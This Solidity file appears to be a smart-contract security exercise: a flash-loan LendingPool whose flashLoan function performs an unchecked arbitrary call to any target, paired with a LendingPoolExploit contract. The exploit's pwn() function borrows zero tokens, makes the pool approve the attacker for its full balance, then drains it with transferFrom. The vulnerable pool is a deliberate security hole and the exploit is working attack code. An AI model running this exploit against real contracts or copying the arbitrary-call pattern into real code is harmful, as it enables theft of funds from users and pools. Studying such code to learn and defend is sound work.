// SPDX-License-Identifier: MIT

/**
LendingPool is offering ERC20 flash loans for free.

*/


pragma solidity ^0.8.17;

import "./IERC20.sol";

contract LendingPool {
    IERC20 public token;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function flashLoan(
        uint _amount,
        address _target,
        bytes calldata _data
    ) external {
        uint balBefore = token.balanceOf(address(this));
        require(balBefore >= _amount, "borrow amount > balance");

        token.transfer(msg.sender, _amount);
        (bool executed, ) = _target.call(_data);
        require(executed, "loan failed");

        uint balAfter = token.balanceOf(address(this));
        require(balAfter >= balBefore, "balance after < before");
    }
}

interface ILendingPool {
    function token() external view returns (address);

    function flashLoan(
        uint amount,
        address target,
        bytes calldata data
    ) external;
}

interface ILendingPoolToken {
    // ILendingPoolToken is ERC20
    function balanceOf(address _owner) external view returns (uint256 balance);
    function approve(address _spender, uint256 _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
}

contract LendingPoolExploit {
    ILendingPool public pool;
    ILendingPoolToken public token;

    constructor(address _pool) {
        pool = ILendingPool(_pool);
        token = ILendingPoolToken(pool.token());
    }

    function pwn() external {
        uint bal = token.balanceOf(address(pool));
        pool.flashLoan(0, address(token), abi.encodeWithSelector(token.approve.selector, address(this), bal));
        token.transferFrom(address(pool), address(this), bal);
    }
}